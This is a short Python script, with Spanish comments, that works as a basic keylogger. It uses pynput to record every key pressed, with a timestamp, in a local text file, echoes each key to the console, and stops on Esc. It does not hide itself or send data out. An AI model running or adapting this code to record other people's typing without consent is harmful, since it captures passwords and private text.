from pynput.keyboard import Key, Listener
from datetime import datetime


def registrar_evento(tecla): # Guarda en archivo de texto
    fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("registro.txt", "a", encoding="utf-8") as archivo:
        archivo.write(f"{fecha_hora} | PRESS | {tecla}\n")


def on_press(key): # Registra tecla presionada
    if key == Key.esc:
        return False

    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)

    print(f"Tecla presionada: {tecla}")
    registrar_evento(tecla)


with Listener(on_press=on_press) as listener:
    listener.join()
